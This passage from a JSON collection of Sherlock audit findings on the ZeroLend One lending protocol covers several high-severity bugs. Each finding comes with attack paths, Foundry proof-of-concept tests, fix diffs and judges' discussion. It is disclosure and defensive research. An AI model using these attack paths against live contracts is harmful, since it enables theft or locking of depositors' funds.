the\n    // user input (ie params.amount)\n    if (params.amount < payback.assets) payback.assets = params.amount;\n\n    reserve.updateInterestRates( // <==== Audit\n      totalSupplies,\n      cache,\n      params.asset,\n      IPool(params.pool).getReserveFactor(),\n      payback.assets,\n      0,\n      params.position,\n      params.data.interestRateData\n    );\n\n    // update balances and total supplies\n    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex); // <==== Audit\n    cache.nextDebtShares = totalSupplies.debtShares; // <==== Audit\n\n    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {\n      userConfig.setBorrowing(reserve.id, false);\n    }\n\n    IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);\n    emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);\n  }\n```\n\n[ReserveLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L145-L182)\n```solidity\n  function updateInterestRates(\n    DataTypes.ReserveData storage _reserve,\n    DataTypes.ReserveSupplies storage totalSupplies,\n    DataTypes.ReserveCache memory _cache,\n    address _reserveAddress,\n    uint256 _reserveFactor,\n    uint256 _liquidityAdded,\n    uint256 _liquidityTaken,\n    bytes32 _position,\n    bytes memory _data\n  ) internal {\n    UpdateInterestRatesLocalVars memory vars;\n\n    vars.totalDebt = _cache.nextDebtShares.rayMul(_cache.nextBorrowIndex); // <==== Audit\n\n    (vars.nextLiquidityRate, vars.nextBorrowRate) = IReserveInterestRateStrategy(_reserve.interestRateStrategyAddress)\n      .calculateInterestRates(\n      _position,\n      _data,\n      DataTypes.CalculateInterestRatesParams({\n        liquidityAdded: _liquidityAdded, // <==== Audit\n        liquidityTaken: _liquidityTaken,\n        totalDebt: vars.totalDebt, // <==== Audit\n        reserveFactor: _reserveFactor,\n        reserve: _reserveAddress\n      })\n    );\n\n    _reserve.liquidityRate = vars.nextLiquidityRate.toUint128();\n    _reserve.borrowRate = vars.nextBorrowRate.toUint128();\n\n    if (_liquidityAdded > 0) totalSupplies.underlyingBalance += _liquidityAdded.toUint128();\n    else if (_liquidityTaken > 0) totalSupplies.underlyingBalance -= _liquidityTaken.toUint128();\n\n    emit PoolEventsLib.ReserveDataUpdated(\n      _reserveAddress, vars.nextLiquidityRate, vars.nextBorrowRate, _cache.nextLiquidityIndex, _cache.nextBorrowIndex\n    );\n  }\n```\n\nInterest rate is updated before repaying the debt and updating the cached `nextDebtShares` which is then used in the interest rate calculation causing it to return a wrong interest rate as it behaves like liquidity was just supplied by the borrower without a change in debt.\n\n### Internal pre-conditions\n\nN/A\n\n### External pre-conditions\n\nN/A\n\n### Attack Path\n\n1. Bob supplies `tokenB`\n2. Alice supplies `tokenA`\n3. Alice borrows `tokenB` causing the utilization goes up and interest rate is updated\n4. Bob starts accruing interest\n5. Alice fully repays `tokenB` but the interest rate is not updated correctly\n6. Bob keeps accruing interest\n\n### Impact\n\nBob keeps accruing interest rate based on the previous debt and even if there are no ongoing borrows and can withdraw it at the expense of other suppliers.\n\n### PoC\n\n```solidity\n  function testRepay() external {\n    _mintAndApprove(alice, tokenA, 3000 ether, address(pool));\n    _mintAndApprove(alice, tokenB, 1000 ether, address(pool));\n    _mintAndApprove(bob, tokenB, 5000 ether, address(pool));\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, 500 ether, 0);\n\n    skip(12);\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, 1000 ether, 0);\n\n    skip(12);\n    oracleA.updateRoundTimestamp();\n    oracleB.updateRoundTimestamp();\n    pool.borrowSimple(address(tokenB), alice, 375 ether, 0);\n\n    skip(12);\n    pool.repaySimple(address(tokenB), type(uint256).max, 0);\n\n    vm.stopPrank();\n\n    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));\n    uint256 bobSupplyAssetsBefore = pool.supplyAssets(address(tokenB), bobPos);\n\n    skip(24 * 30 * 60 * 60);\n\n    pool.forceUpdateReserve(address(tokenB));\n\n    assertGt(pool.supplyAssets(address(tokenB), bobPos), bobSupplyAssetsBefore); // Bob accrued interest even if there are no borrows anymore\n\n    vm.startPrank(bob);\n    // Reverts because Bob shares with the accrued interest exceed the pool balance but\n    // succeed if there were other suppliers.\n    vm.expectRevert();\n    pool.withdrawSimple(address(tokenB), bob, type(uint256).max, 0);\n\n    vm.stopPrank();\n  }\n```\n\n### Mitigation\n\n```diff\ndiff --git a/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol b/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol\nindex 92806b1..c070fb1 100644\n--- a/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol\n+++ b/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol\n@@ -136,6 +136,14 @@ library BorrowLogic {\n     // user input (ie params.amount)\n     if (params.amount < payback.assets) payback.assets = params.amount;\n\n+    // update balances and total supplies\n+    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex);\n+    cache.nextDebtShares = totalSupplies.debtShares;\n+\n+    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {\n+      userConfig.setBorrowing(reserve.id, false);\n+    }\n+\n     reserve.updateInterestRates(\n       totalSupplies,\n       cache,\n@@ -147,14 +155,6 @@ library BorrowLogic {\n       params.data.interestRateData\n     );\n\n-    // update balances and total supplies\n-    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex);\n-    cache.nextDebtShares = totalSupplies.debtShares;\n-\n-    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {\n-      userConfig.setBorrowing(reserve.id, false);\n-    }\n-\n     IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);\n     emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);\n   }\n```",
      "summary": "\nThe bug report discusses an issue with the interest rate being updated before the debt is updated when repaying debt in a specific contract. This leads to an incorrect total debt being used when calculating new interest rates, causing suppliers to continue accruing interest even if there are no ongoing borrows. The root cause of this issue is due to the interest rate being updated before the debt is repaid and the cached debt being used in the interest rate calculation. This can potentially allow a user to withdraw more funds than they should at the expense of other suppliers. The report includes a PoC (proof of concept) to demonstrate the bug and suggests a mitigation to fix the issue. ",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/413",
      "tags": [],
      "finders": [
        "stuart\\_the\\_minion",
        "lemonmon",
        "0xweebad",
        "imsrybr0",
        "TessKimy",
        "JCN",
        "Tendency",
        "000000",
        "trachev",
        "almurhasan",
        "ether\\_sky",
        "Obsidian",
        "Varun\\_05",
        "A2-security"
      ]
    },
    {
      "id": "41819",
      "title": "H-9: Function `executeMintToTreasury` will incorrectly reduce the `supplyShares`, therefore prevent the last users  from withdrawing",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/375 \n\n## Found by \n000000, 0xAlix2, 0xc0ffEE, A2-security, Honour, KupiaSec, Nihavent, Obsidian, Tendency, Valy001, Varun\\_05, coffiasd, ether\\_sky, iamnmt, imsrybr0, lemonmon, silver\\_eth, stuart\\_the\\_minion, trachev\n### Summary\n\nThe incorrect reduction in `PoolLogic::executeMintToTreasury` will cause failure of some (likely to be the last) user's withdrawal, and the fund will be locked.\n\n### Root Cause\n\nThe `totalSupply.supplyShares` is supposed to be the sum of `balances.supplyShares`, as they are always updated in tandem: \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L94-L95\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L48-L49\n\nIf this is not held, then some users will not be able to withdraw their collateral, as the `totalSupply.supplyShares` will underflow and revert. \n\nHowever in the `PoolLogic::executeMintToTreasury` updates the `totalSupply.supplyShares` without updating any user's balance. It is because it incorrectly assumes that there is share to be burned, even though the accrued amount was never really minted to the treasury (in that the treasury's share balance was not added). If it is so, that share should be burned from the treasury.\n\nAlso, for example, when premium is added via flashloan, the premium is counted as underlyingBalance: https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/FlashLoanLogic.sol#L118\n\nTherefore, when the underlying asset is transferred out via `executeMintToTreasury`, the `underlyingBalance` should be updated accordingly.\n\n\n### Internal pre-conditions\n\nNon-zero `accruedToTreasuryShares`\n\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Anybody calls `withdraw` or `withdrawSimple`, it will reduce the `asset`'s `totalSupply.supplyShares` incorrectly.\n\n### impact\n\nThe last user(s) who is trying to withdraw will fail, and their fund will be locked\n\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nSuggestion of mitigation:\n\n\n```solidity\n// PoolLogic.sol\n  function executeMintToTreasury(\n    DataTypes.ReserveSupplies storage totalSupply,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    address treasury,\n    address asset\n  ) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n\n    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;\n\n    if (accruedToTreasuryShares != 0) {\n      reserve.accruedToTreasuryShares = 0;\n      uint256 normalizedIncome = reserve.getNormalizedIncome();\n      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);\n\n      IERC20(asset).safeTransfer(treasury, amountToMint);\n-     totalSupply.supplyShares -= accruedToTreasuryShares;\n+     totalSupply.underlyingBalance -= amountToMint;\n\n      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);\n    }\n  }\n```",
      "summary": "\nThis bug report highlights an issue with the function `executeMintToTreasury` in the code of a project called ZeroLend. The bug causes the supply of shares to be incorrectly reduced, which prevents the last users from withdrawing their funds. The bug was found by a group of individuals and could potentially lead to the funds being locked. The root cause of the bug is that the total supply of shares is not being updated correctly when the function is called. This means that some users will not be able to withdraw their funds, as the total supply will be too low. The bug can be triggered by anyone calling the `withdraw` or `withdrawSimple` functions. The impact of this bug is that the last users trying to withdraw will fail and their funds will be locked. A potential solution to mitigate this bug is suggested in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/375",
      "tags": [],
      "finders": [
        "imsrybr0",
        "Tendency",
        "trachev",
        "0xAlix2",
        "silver\\_eth",
        "iamnmt",
        "lemonmon",
        "KupiaSec",
        "000000",
        "ether\\_sky",
        "Obsidian",
        "A2-security",
        "stuart\\_the\\_minion",
        "Nihavent",
        "Varun\\_05",
        "Valy001",
        "0xc0ffEE",
        "Honour",
        "coffiasd"
      ]
    },
    {
      "id": "41818",
      "title": "H-8: Liquidated positions will still accrue rewards after being liquidated",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/312 \n\n## Found by \n0xNirix, A2-security, JCN, Obsidian, TessKimy, ZC002, iamnmt, tallo\n### Summary\n\nThe NFTRewardsDistributor contract which is responsible for managing a users rewards using a masterchef algorithm does not get updated with a users underlying position in a pool is liquidated.  This results in the position wrongfully continuing to accrue rewards with an outdated asset balance.\n\n### Root Cause\n\nThe choice to neglect updating the NFTPositionManager contract when a position is liquidated is the root cause of this issue due to the NFTPositionManager contract not containing up-to-date user balances for calculating rewards.\n\n```solidity\n  function earned(uint256 tokenId, bytes32 _assetHash) public view returns (uint256) {\n    return _balances[tokenId][_assetHash].mul(rewardPerToken(_assetHash).sub(userRewardPerTokenPaid[tokenId][_assetHash])).div(1e18).add(\n      rewards[tokenId][_assetHash]\n    );\n  }\n```\nThe above calculations are done in `NFTRewardsDistributor.sol:98` to determine an NFT positions rewards. Due to this bug, the users balance ```_balances[tokenId][_assetHash]``` will be incorrect, leading to overinflated rewards.\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTRewardsDistributor.sol#L98C1-L102C4\n### Internal pre-conditions\n\n1. User needs to have a position NFT registered with the NFTPositionManager contract\n2. The NFTPositionManager needs to have rewards accrual enabled for there to be any impact\n3. The users NFT position needs to be liquidated due to their position being unhealthy\n\n### External pre-conditions\n\n1. Users collateral assets need to drop in enough in price to make their position liquidatable\n2. Any user needs to liquidate the users position\n\n### Attack Path\n\n1. User creates a position\n2. The NFTPositionManager contract will start accruing rewards for the user\n3. The users position's collateral drops in price enough to make their position unhealthy\n4. The user gets liquidated\n5. The user will continue to accrue rewards pertaining to their NFT's position for as long as they wish because the NFTPositionManager believes they are still providing collateral and borrowing assets. \n6. The user withdraws their accrued rewards whenever they wish\n\n### Impact\n\nThe liquidated user will essentially be able to steal rewards from the protocol/other users since their position won't be backed by any collateral.\n\n### PoC\n\n```solidity\n  function test_UserAccruesRewardsWhileLiquidatedBug() public {\n    NFTPositionManager _nftPositionManager = new NFTPositionManager();\n    TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(_nftPositionManager), admin, bytes(''));\n    nftPositionManager = NFTPositionManager(payable(address(proxy)));\n    nftPositionManager.initialize(address(poolFactory), address(0x123123), owner, address(tokenA), address(wethToken));\n\n    uint256 mintAmount = 100 ether;\n    uint256 supplyAmount = 1 ether;\n    uint256 tokenId = 1;\n    bytes32 REWARDS_ALLOCATOR_ROLE = keccak256('REWARDS_ALLOCATOR_ROLE');\n\n    //approvals\n    _mintAndApprove(owner, tokenA, 30e18, address(nftPositionManager));\n    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); // alice 1000 tokenA\n    _mintAndApprove(bob, tokenB, 2000 ether, address(pool)); // bob 2000 tokenB\n    _mintAndApprove(bob, tokenA, 2000 ether, address(pool)); // bob 2000 tokenB\n\n    //grant the pool some rewards\n    vm.startPrank(owner);\n    nftPositionManager.grantRole(REWARDS_ALLOCATOR_ROLE, owner);\n    nftPositionManager.notifyRewardAmount(10e18, address(pool), address(tokenA), false);\n    vm.stopPrank();\n\n\n    DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));\n    INFTPositionManager.AssetOperationParams memory params =\n      INFTPositionManager.AssetOperationParams(address(tokenA), alice, 550 ether, tokenId, data);\n    INFTPositionManager.AssetOperationParams memory params2 =\n      INFTPositionManager.AssetOperationParams(address(tokenB), bob, 750 ether, 2, data);\n    INFTPositionManager.AssetOperationParams memory params3 =\n      INFTPositionManager.AssetOperationParams(address(tokenA), bob, 550 ether, 2, data);\n    INFTPositionManager.AssetOperationParams memory borrowParams =\n      INFTPositionManager.AssetOperationParams(address(tokenB), alice, 100 ether, tokenId, data);\n\n    vm.startPrank(alice);\n    tokenA.approve(address(nftPositionManager), 100000 ether);\n    tokenA.approve(address(pool), 100000 ether);\n    nftPositionManager.mint(address(pool));\n    nftPositionManager.supply(params);\n    console.log(\"Alice deposits %e of token A\", params.amount);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    tokenB.approve(address(nftPositionManager), 100000 ether);\n    tokenA.approve(address(nftPositionManager), 100000 ether);\n    tokenB.approve(address(pool), 100000 ether);\n    nftPositionManager.mint(address(pool));\n    nftPositionManager.supply(params2);\n    nftPositionManager.supply(params3);\n    console.log(\"Bob deposits %e of token A\", params3.amount);\n    vm.stopPrank();\n\n    vm.prank(alice);\n    nftPositionManager.borrow(borrowParams);\n\n\n    bytes32 assetHashA = nftPositionManager.assetHash(address(pool), address(tokenA), false);\n    bytes32 pos = keccak256(abi.encodePacked(nftPositionManager, 'index', uint256(1)));\n    console.log(\"\\nAlice rewards earned before liquidation: %e\", nftPositionManager.earned(1, assetHashA));\n    console.log(\"Bob rewards earned before Alice is Liquidated: %e\\n\", nftPositionManager.earned(2, assetHashA));\n    oracleA.updateAnswer(3e5);\n    vm.prank(bob);\n    console.log(\"Bob liquidates Alice\");\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 550 ether);\n    console.log(\"Skip ahead until end of rewards cycle...\");\n    vm.warp(block.timestamp+14 days);\n\n    console.log(\"\\nAlice rewards earned after liquidation: %e\", nftPositionManager.earned(1, assetHashA));\n    console.log(\"Bob rewards earned after Alice is liquidated: %e\", nftPositionManager.earned(2, assetHashA));\n    console.log(\"Alice rewards equal to Bob rewards: \", nftPositionManager.earned(1, assetHashA) == nftPositionManager.earned(2, assetHashA));\n\n  }\n```\n#### Logs\nOutput:\n  Alice deposits 5.5e20 of token A\n  Bob deposits 5.5e20 of token A\n\n  Alice rewards earned before liquidation: 0e0\n  Bob rewards earned before Alice is Liquidated: 0e0\n\n  Bob liquidates Alice\n  Skip ahead until end of rewards cycle...\n\n  Alice rewards earned after liquidation: 4.99999999999953585e18\n  Bob rewards earned after Alice is liquidated: 4.99999999999953585e18\n  Alice rewards equal to Bob rewards:  true\n\nThe PoC shows that even though Alice was liquidated, she continued to accrue the same amount of rewards as Bob over the time period.\n\n### Mitigation\n\nWhen necessary, the liquidation function should callback to the NFT position contract to update the liquidated users position with the contract so they don't continue to accrue rewards.",
      "summary": "\nThis bug report discusses an issue with the NFTRewardsDistributor contract, which manages a user's rewards using a masterchef algorithm. The problem is that when a user's position in a pool is liquidated, the contract is not updated, resulting in the position continuing to accrue rewards with an outdated asset balance. This means that the user can essentially steal rewards from the protocol or other users. \n\nThe root cause of this issue is neglecting to update the NFTPositionManager contract when a position is liquidated, which leads to incorrect user balances and inflated rewards. This bug can only occur if the user has a position NFT registered with the NFTPositionManager contract and rewards accrual is enabled. The user's position must also be liquidated due to an unhealthy position. \n\nTo exploit this bug, a user would create a position, and the NFTPositionManager contract would start accruing rewards for them. If their position becomes unhealthy and they are liquidated, they will continue to accrue rewards as if they still had collateral. This can happen if the user's collateral assets drop in price enough to make their position liquidatable, and any user can then liquidate their position. \n\nThe impact of this bug is that the liquidated user can steal rewards from the protocol or other users, as their position is not backed by any collateral. The proof of concept provided in the report shows that even after being liquidated, the user continues to accrue the same amount of rewards as before. \n\nTo mitigate this issue, the liquidation function should update the NFTPositionManager contract to prevent the liquidated user from continuing to accrue rewards. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/312",
      "tags": [],
      "finders": [
        "TessKimy",
        "tallo",
        "JCN",
        "ZC002",
        "0xNirix",
        "Obsidian",
        "A2-security",
        "iamnmt"
      ]
    },
    {
      "id": "41817",
      "title": "H-7: When bad debt is accumulated, the loss is not shared amongst all suppliers, instead the last to withdraw will experience a huge loss",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/275 \n\n## Found by \nA2-security, Nihavent, Obsidian, joshuajee, tallo\n### Summary\n\nWhen bad debt is accumulated, it should be socialised amongst all suppliers.\n\nThe issue is that the protocol does not do this, instead only the last users to withdraw funds will feel the effects of the bad debt.\n\nIf a pool experiences bad debt, the first users to withdraw will experience 0 loss, while the last to withdraw will experience a severe loss.\n\n### Root Cause\nThe [withdrawn](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L106) assets is calculated as `shares * liquidityIndex` which does not take into account bad debt\n\nThis means that even if bad debt accrues, the first users to withdraw will be able to withdraw their shares to assets at a good rate, leaving the last users with all the loss. \n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n**This attack path is shown in the PoC:**\n\n1. User A supplies 50 ETH to the pool\n2. User B supplies 50 ETH to the pool\n3. A bad debt liquidation occurs, so the liquidator only repaid 64 ETH out of the 100 ETH\n4. User A is still able to withdraw their 50 ETH\n5. User B is left with less than 14 ETH able to be withdrawn\n\n### Impact\n\nHuge fund loss for the suppliers last to withdraw\n\nEarly withdrawers effectively steal from the late withdrawers\n\n### PoC\n\nAdd the following test to `PoolLiquidationTests.t.sol`\n\n```solidity\nfunction test__BadDebtLiquidationIsNotSocialised() external {\n    // Setup users\n    address supplierOfTokenB = address(124343434);\n    address liquidator = address(8888);\n    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); \n    _mintAndApprove(bob, tokenB, 50 ether, address(pool)); \n    _mintAndApprove(supplierOfTokenB, tokenB, 50 ether, address(pool)); \n    _mintAndApprove(liquidator, tokenB, 100 ether, address(pool)); \n    console.log(\"bob balance before: %e\", tokenB.balanceOf(bob));\n    // alice supplies 134 ether of tokenA\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, 268 ether, 0); \n    vm.stopPrank();\n\n    // bob supplies 50 ether of tokenB\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, 50 ether, 0); \n    vm.stopPrank();\n\n    // supplierOfTokenB supplies 50 ether of tokenB\n    vm.startPrank(supplierOfTokenB);\n    pool.supplySimple(address(tokenB), supplierOfTokenB, 50 ether, 0); \n    vm.stopPrank();\n\n    // alice borrows 100 ether of tokenB\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, 100 ether, 0); \n    vm.stopPrank();\n\n    // Drops the collateral price to make the position liquidatable\n    // the drop is large enough to make the position in bad debt\n    oracleA.updateAnswer(5e7); \n\n    // liquidator liqudiates the position\n    // note that he takes all of alice's collateral\n    vm.startPrank(liquidator);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 64 ether);\n\n    // bob sees that the position is in bad debt and quickly withdraws all that he supplied\n    // bob does not experience any loss from the bad debt\n    vm.startPrank(bob);\n    pool.withdrawSimple(address(tokenB), bob, 50 ether, 0);\n\n    // supplierOfTokenB tries to withdraw his funds but it reverts, since there is none left\n    vm.startPrank(supplierOfTokenB);\n    vm.expectRevert();\n    pool.withdrawSimple(address(tokenB), supplierOfTokenB, 50 ether, 0);\n\n    // the maximum amount supplierOfTokenB can withdraw is 13 ether of tokenB\n    // since that is all that is left in the pool\n    pool.withdrawSimple(address(tokenB), supplierOfTokenB, 13 ether, 0);\n\n    // log the final state\n    console.log(\"The following is the final state\");\n\n    // show that there is no more tokenB left in the pool after bob withdrew everything\n    uint256 PoolBalanceOfB = tokenB.balanceOf(address(pool));\n    console.log(\"Remaining balance of tokenB in the pool = %e\", PoolBalanceOfB);\n\n    // show that bob got back the 50 ether he deposited\n    uint256 BobBalanceOfB = tokenB.balanceOf(bob);\n    console.log(\"bob's balance of tokenB = %e\", BobBalanceOfB);\n\n    // show that supplierOfTokenB only got back 13 ether of tokenB\n    uint256 SupplierBalanceOfB = tokenB.balanceOf(supplierOfTokenB);\n    console.log(\"SupplierBalanceOfB balance of tokenB = %e\", SupplierBalanceOfB);\n\n    uint256 aliceCollateral = pool.getBalance(address(tokenA), alice, 0);\n    console.log(\"aliceCollateral =%e \", aliceCollateral);\n  }\n```\n**Console output:**\n\n```bash\nRan 1 test for test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest\n[PASS] test__BadDebtLiquidationIsNotSocialised() (gas: 1089597)\nLogs:\n  The following is the final state\n  Remaining balance of tokenB in the pool = 8.09523809523809524e17\n  bob's balance of tokenB = 5e19\n  SupplierBalanceOfB balance of tokenB = 1.3e19\n  aliceCollateral =0e0 \n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.34ms (1.66ms CPU time)\n\nRan 1 test suite in 11.14ms (4.34ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n### Mitigation\n\nSocialise the loss among all depositors",
      "summary": "\nThis bug report is about an issue where the loss from bad debt is not shared among all suppliers in a protocol. Instead, only the last users to withdraw their funds will experience a significant loss. This means that the earlier users who withdraw will not be affected by the bad debt, while the later users will suffer a large loss. The root cause of this issue is that the assets withdrawn are calculated based on shares and liquidity index, which does not take into account bad debt. This allows early withdrawers to essentially steal from the late withdrawers. A proof of concept (PoC) has been provided to demonstrate this attack path. The impact of this bug is a huge loss for the suppliers who are the last to withdraw their funds. The suggested mitigation is to socialize the loss among all depositors to prevent this issue from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/275",
      "tags": [],
      "finders": [
        "Nihavent",
        "tallo",
        "joshuajee",
        "Obsidian",
        "A2-security"
      ]
    },
    {
      "id": "41816",
      "title": "H-6: Malicious pool deployer can set a malicious interest rate contract to lock funds of vault depositors",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/233 \n\n## Found by \nA2-security, Obsidian, iamnmt\n### Summary\n\nOnce vault depositors have deposited funds into a pool, a malicious pool creator can upgrade the `interestRateStrategy` contract (using `PoolConfigurator.setReserveInterestRateStrategyAddress()` to make all calls to it revert.\n\nAs a result any function of the protocol that calls `updateInterestRates()` will revert because `updateInterestRates()` makes the following [call](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L160-L171):\n```solidity\n(vars.nextLiquidityRate, vars.nextBorrowRate) = IReserveInterestRateStrategy(_reserve.interestRateStrategyAddress)\n      .calculateInterestRates(\n      /* PARAMS */\n    );\n```\n\nThe main impact is that now withdrawals will revert because `executeWithdraw()` calls `updateInterestRates()` which will always revert, so the funds that vault users deposited into this pool are lost forever.\n\n### Root Cause\n\nAllowing the pool deployer to specify any `interestRateStrategyAddress`\n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Vault users deposit into the pool\n2. the deployer sets their `interestRateStrategy` contract to make all calls to it revert\n3. All calls to withdraw funds from the pool will revert, the vault depositors have lost their funds\n\n### Impact\n\nAll the funds deposited to the pool from the vault will be lost\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nUse protocol whitelisted interest rate calculation contracts\n\n\n\n## Discussion\n\n**nevillehuang**\n\nInvalid, require malicious admin\n\n> Essentially we expect all permissioned actors to behave rationally.\n\n**iamnmt**\n\nEscalate\n\nPer the contest's `README`\n\n> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\nThis statement makes this issue valid.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> Per the contest's `README`\n> \n> > There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n> \n> This statement makes this issue valid.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**zarkk01**\n\nIMO, the issue is **invalid** due to this statement of the sponsor.\n\n> Essentially we expect all permissioned actors to behave rationally.\n\nIt is, absolutely, irrational for a deployer to set a malicious interest rate contract since he has **nothing** to earn out of this behaviour. \n\n\n**0xSpearmint**\n\nThe permissioned actors the protocol refers to are the protocol controlled `PoolConfigurator` and `owner` roles. They can be expected to act rationally. \n\nThis issue involves a malicious pool deployer (which can be anyone).\n\nDeploying pools is permission-less, which is why the protocol was interested in such issues as they clearly stated in the README:\n>There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\n**cvetanovv**\n\nI agree with the escalation of this issue to be High severity. For more information on what I think about the rule, you can see this comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2413297520\n\nPlanning to accept the escalation and make this issue High severity.\n\n**WangSecurity**\n\nResult:\nHigh \nHas duplicates\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [iamnmt](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/233/#issuecomment-2391294265): accepted\n\n**DemoreXTess**\n\n@cvetanovv Can we reconsider this issue per this comment : https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2427578837_\n\nThe report wrongly states that the funds are locked forever. ZeroLend has permission to make changes on the pools. Users can get back their funds after adjustment by ZeroLend\n\n**0xSpearmint**\n\nThe referenced [comment ](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2427578837)is not accurate.\n\nEven if the protocol sets a new IRM through [this only configurator function](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/Pool.sol#L150-L158), the pool admin can instantly change it back to the malicious IRM using [this only pool admin function](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/manager/PoolConfigurator.sol#L105-L111). \n\n**cvetanovv**\n\nI agree with @0xSpearmint comment. Even if ZeroLend makes any changes, the malicious pool admin can immediately roll back the previous configuration.\n\n**DemoreXTess**\n\n@cvetanovv  \nIs there a problem in this one, it says escalation resolved with has duplicates but the label is not added.\n\n**cvetanovv**\n\n@DemoreXTess That's not a problem. The labels of duplicate issues will be added after all escalations are resolved.\n\n**Joshuajee**\n\n@cvetanovv and @WangSecurity ,\n\nSorry, this might be coming late, but I don't believe that this issue meets the criteria of becoming a High because;\n\n1. It relies on the pool deployer becoming Malicious, what are the chances?\n2. It also relies on the vault managers not doing their due diligence on checking if the pool's strategy is indeed safe.\n3. Vault Managers are risk managers and should do their thorough checks on every pool, including oracles and strategy contracts before adding such. \n\nThe whole reason for validating this is that the pool deployer can hurt the vault manager, but the vault manager should be rational enough to check the rate strategy contract, before trusting a pool.\n\n\n**cvetanovv**\n\n> @cvetanovv and @WangSecurity ,\n> \n> 